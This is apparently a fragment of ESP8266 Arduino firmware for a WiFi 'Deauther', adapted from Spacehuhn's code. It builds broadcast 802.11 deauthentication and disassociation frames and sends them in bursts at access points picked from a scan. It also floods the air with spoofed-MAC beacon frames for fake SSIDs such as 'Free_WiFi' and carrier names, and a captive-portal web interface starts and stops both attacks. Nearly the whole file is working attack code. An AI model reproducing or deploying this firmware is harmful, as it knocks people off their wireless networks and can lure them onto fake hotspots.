// Deauth frame — exact bytes from Spacehuhn source
// 802.11 management frame type 0xC0 (deauth) or 0xA0 (disassoc)
uint8_t deauth_frame[26] = {
  /* FC       */ 0xC0, 0x00,
  /* Duration */ 0x00, 0x00,
  /* DA       */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // broadcast (all stations)
  /* SA/BSSID */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // filled from scanned AP
  /* BSSID    */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // filled from scanned AP
  /* Seq Ctrl */ 0x00, 0x00,
  /* Reason   */ 0x07, 0x00   // reason 7 = deauth because STA is leaving BSS
};

uint8_t disassoc_frame[26] = {
  /* FC       */ 0xA0, 0x00,
  /* Duration */ 0x00, 0x00,
  /* DA       */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  /* SA/BSSID */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  /* BSSID    */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  /* Seq Ctrl */ 0x00, 0x00,
  /* Reason   */ 0x07, 0x00
};

// EEPROM
// ─────────────────────────────────────────────────────────────
#define EEPROM_SIZE  (2 + MAX_SSID_NUM * SSID_MAX_LEN)

void saveSSIDs() {
  EEPROM.write(0, EEPROM_MAGIC);
  EEPROM.write(1, (uint8_t)ssidCount);
  int addr = 2;
  for (int i = 0; i < ssidCount; i++) {
    for (int j = 0; j < SSID_MAX_LEN; j++)
      EEPROM.write(addr++, ssidList[i][j]);
  }
  EEPROM.commit();
}

void loadSSIDs() {
  if (EEPROM.read(0) != EEPROM_MAGIC) return;
  ssidCount = EEPROM.read(1);
  if (ssidCount < 0 || ssidCount > MAX_SSID_NUM) { ssidCount = 0; return; }
  int addr = 2;
  for (int i = 0; i < ssidCount; i++) {
    for (int j = 0; j < SSID_MAX_LEN; j++)
      ssidList[i][j] = EEPROM.read(addr++);
    ssidList[i][SSID_MAX_LEN - 1] = '\0';
  }
}

// ─────────────────────────────────────────────────────────────
// SPACEHUHN DEAUTH LOGIC (exact from Attack.cpp)
// sendDeauth(bssid, channel, pkts) →
//   - set channel
//   - copy bssid into SA and BSSID fields of frame
//   - send deauth + disassoc back to back N times
//   - increment seq number each send
// ─────────────────────────────────────────────────────────────
void sendDeauth(uint8_t *bssid, uint8_t ch, int packets) {
  wifi_set_channel(ch);

  // Fill SA (bytes 10-15) and BSSID (bytes 16-21)
  memcpy(&deauth_frame[10],  bssid, 6);
  memcpy(&deauth_frame[16],  bssid, 6);
  memcpy(&disassoc_frame[10], bssid, 6);
  memcpy(&disassoc_frame[16], bssid, 6);

  for (int i = 0; i < packets; i++) {
    // Sequence number — 12-bit counter, little endian in bits 4-15 of seq field
    uint16_t seq = (seqNum << 4) & 0xFFF0;
    deauth_frame[22]  = seq & 0xFF;
    deauth_frame[23]  = seq >> 8;
    disassoc_frame[22] = seq & 0xFF;
    disassoc_frame[23] = seq >> 8;
    seqNum = (seqNum + 1) & 0xFFF;

    wifi_send_pkt_freedom(deauth_frame,  sizeof(deauth_frame),  0);
    delayMicroseconds(500);
    wifi_send_pkt_freedom(disassoc_frame, sizeof(disassoc_frame), 0);
    delayMicroseconds(500);
  }
}

// ─────────────────────────────────────────────────────────────
// SPACEHUHN BEACON LOGIC (exact from Attack.cpp)
// buildBeacon(ssid, ch) →
//   - 24-byte 802.11 header
//   - 8-byte timestamp (micros64)
//   - 2-byte beacon interval (100 TU = 0x6400)
//   - 2-byte capability info (0x0401 = ESS + short preamble)
//   - IE 0x00: SSID
//   - IE 0x01: Supported Rates [82 84 8B 96 0C 12 24 48]
//   - IE 0x03: DS Parameter (channel)
//   - IE 0x05: TIM (Traffic Indication Map)
// ─────────────────────────────────────────────────────────────
void sendBeacon(const char *ssid, uint8_t ch, bool wpa) {
  uint8_t ssidLen = strlen(ssid);
  // Frame: 24 (hdr) + 8 (ts) + 2 (interval) + 2 (cap) +
  //        2+ssidLen (ssid IE) + 10 (rates IE) + 3 (ds IE) + 6 (tim IE)
  int frameLen = 24 + 8 + 2 + 2 + 2 + ssidLen + 10 + 3 + 6;
  uint8_t pkt[frameLen];
  memset(pkt, 0, frameLen);

  // 802.11 MAC header (24 bytes)
  pkt[0] = 0x80; pkt[1] = 0x00;         // Frame Control: beacon
  pkt[2] = 0x00; pkt[3] = 0x00;         // Duration
  // DA: broadcast
  pkt[4]=0xFF; pkt[5]=0xFF; pkt[6]=0xFF;
  pkt[7]=0xFF; pkt[8]=0xFF; pkt[9]=0xFF;
  // SA: spoofed MAC — Spacehuhn generates from SSID so each SSID has unique MAC
  pkt[10] = 0x0A;
  pkt[11] = (uint8_t)(ssid[0]);
  pkt[12] = (uint8_t)(ssidLen);
  pkt[13] = (uint8_t)(ssid[ssidLen > 1 ? 1 : 0] + ch);
  pkt[14] = (uint8_t)(ch * 3);
  pkt[15] = 0x00;
  memcpy(&pkt[16], &pkt[10], 6);  // BSSID = SA
  // Seq ctrl
  uint16_t seq = (seqNum << 4) & 0xFFF0;
  pkt[22] = seq & 0xFF;
  pkt[23] = seq >> 8;
  seqNum = (seqNum + 1) & 0xFFF;

  int pos = 24;

  // Timestamp (8 bytes) — μs since boot
  uint64_t ts = micros64();
  memcpy(&pkt[pos], &ts, 8); pos += 8;

  // Beacon interval: 100 TU = 0x0064 little endian
  pkt[pos++] = 0x64; pkt[pos++] = 0x00;

  // Capability info: ESS (0x0001) + Short Preamble (0x0020) = 0x0021
  // Spacehuhn uses 0x0431 for WPA, 0x0021 for open
  uint16_t cap = wpa ? 0x0431 : 0x0021;
  pkt[pos++] = cap & 0xFF;
  pkt[pos++] = cap >> 8;

  // IE 0: SSID
  pkt[pos++] = 0x00;
  pkt[pos++] = ssidLen;
  memcpy(&pkt[pos], ssid, ssidLen); pos += ssidLen;

  // IE 1: Supported Rates (8 rates — exact from Spacehuhn)
  pkt[pos++] = 0x01; pkt[pos++] = 0x08;
  pkt[pos++] = 0x82; // 1 Mbps  (basic)
  pkt[pos++] = 0x84; // 2 Mbps  (basic)
  pkt[pos++] = 0x8B; // 5.5 Mbps(basic)
  pkt[pos++] = 0x96; // 11 Mbps (basic)
  pkt[pos++] = 0x0C; // 6 Mbps
  pkt[pos++] = 0x12; // 9 Mbps
  pkt[pos++] = 0x24; // 18 Mbps
  pkt[pos++] = 0x48; // 36 Mbps

  // IE 3: DS Parameter Set (current channel)
  pkt[pos++] = 0x03; pkt[pos++] = 0x01;
  pkt[pos++] = ch;

  // IE 5: TIM (Traffic Indication Map)
  pkt[pos++] = 0x05; pkt[pos++] = 0x04;
  pkt[pos++] = 0x00; // DTIM count
  pkt[pos++] = 0x01; // DTIM period
  pkt[pos++] = 0x00; // bitmap ctrl
  pkt[pos++] = 0x00; // partial virtual bitmap

  wifi_set_channel(ch);
  wifi_send_pkt_freedom(pkt, pos, 0);
}

void doScan() {
  // Spacehuhn: mode STATION for scan, then back to SOFTAP_STA
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks(false, true);
  apCount = 0;

  for (int i = 0; i < n && apCount < MAX_AP_NUM; i++) {
    aps[apCount].channel = WiFi.channel(i);
    aps[apCount].rssi    = WiFi.RSSI(i);
    aps[apCount].encType = WiFi.encryptionType(i);
    aps[apCount].selected = false;
    String s = WiFi.SSID(i);
    s.toCharArray(aps[apCount].ssid, SSID_MAX_LEN);
    WiFi.BSSID(i, aps[apCount].bssid);
    apCount++;
  }

  WiFi.scanDelete();

  // Restore AP mode
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(AP_IP_ADDR, AP_IP_ADDR, IPAddress(255,255,255,0));
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
}

String macStr(uint8_t *m) {
  char buf[18];
  sprintf(buf,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
  return String(buf);
}

int rssiPct(int rssi) {
  if (rssi >= -50) return 100;
  if (rssi <= -100) return 0;
  return 2 * (rssi + 100);
}

void setup() {
  Serial.begin(115200);
  Serial.println(F("\n[CSM] Booting Deauther v2..."));

  EEPROM.begin(EEPROM_SIZE);
  loadSSIDs();

  // Default SSIDs if first boot
  if (ssidCount == 0) {
    const char *def[] = {
      "Free_WiFi","Airport_WiFi","Hotel_Guest","Starbucks",
      "Library_Net","Bus_Station_WiFi","Mall_Guest",
      "Public_Hotspot","Open_Network","Guest_Access",
      "BDTelecom_Free","Grameenphone_Free","Robi_Free",
      "Banglalink_Free","Teletalk_Free"
    };
    ssidCount = 15;
    for (int i=0;i<ssidCount;i++)
      strncpy(ssidList[i], def[i], SSID_MAX_LEN-1);
  }

  // AP mode — Spacehuhn: use WIFI_AP_STA so scan still works
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(AP_IP_ADDR, AP_IP_ADDR, IPAddress(255,255,255,0));
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);

  // Wildcard DNS for captive portal
  dns.start(53, "*", AP_IP_ADDR);

  // Routes
  server.on("/",              HTTP_GET,  pageScan);
  server.on("/scan",          HTTP_POST, handleScan);
  server.on("/select",        HTTP_POST, handleSelect);
  server.on("/attack",        HTTP_GET,  pageAttack);
  server.on("/attack/start",  HTTP_POST, handleAttackStart);
  server.on("/attack/stop",   HTTP_POST, handleAttackStop);
  server.on("/beacon",        HTTP_GET,  pageBeacon);
  server.on("/beacon/save",   HTTP_POST, handleBeaconSave);
  server.on("/beacon/start",  HTTP_POST, handleBeaconStart);
  server.on("/beacon/stop",   HTTP_POST, handleBeaconStop);
  server.on("/settings",      HTTP_GET,  pageSettings);
  server.on("/reboot",        HTTP_POST, handleReboot);
  server.onNotFound(handleCaptive);

  server.begin();

  // Spacehuhn: disable promiscuous before attacks, enable only during scan
  wifi_promiscuous_enable(0);

  Serial.println(F("[CSM] Ready. Connect to 'CSM Mohasin' → 192.168.4.1"));
}

// ─────────────────────────────────────────────────────────────
// MAIN LOOP — Spacehuhn pattern:
// handleClient() → check attack timer → send burst → next AP
// check beacon timer → send one beacon → next SSID
// ─────────────────────────────────────────────────────────────
void loop() {
  dns.processNextRequest();
  server.handleClient();

  // ── Deauth loop ──
  // Spacehuhn cycles through selected APs one at a time per interval
  if (deauthRunning && apCount > 0) {
    if (millis() - deauthTimer >= (uint32_t)attackInterval) {
      deauthTimer = millis();

      // Find next selected AP
      int tried = 0;
      while (tried < apCount) {
        if (aps[deauthCurrent].selected) {
          sendDeauth(
            aps[deauthCurrent].bssid,
            aps[deauthCurrent].channel,
            attackPkts
          );
          deauthCurrent = (deauthCurrent + 1) % apCount;
          break;
        }
        deauthCurrent = (deauthCurrent + 1) % apCount;
        tried++;
      }
      // If nothing selected, stop
      if (tried == apCount) deauthRunning = false;
    }
  }

  // ── Beacon loop ──
  // Spacehuhn: one beacon per 50ms, cycle all SSIDs, increment channel per full cycle
  if (beaconRunning && ssidCount > 0) {
    if (millis() - beaconTimer >= 50) {
      beaconTimer = millis();
      sendBeacon(ssidList[beaconCurrent], beaconChannel, beaconWPA);
      beaconCurrent = (beaconCurrent + 1) % ssidCount;
      if (beaconCurrent == 0) {
        beaconChannel = (beaconChannel % 13) + 1;
      }
    }
  }
}
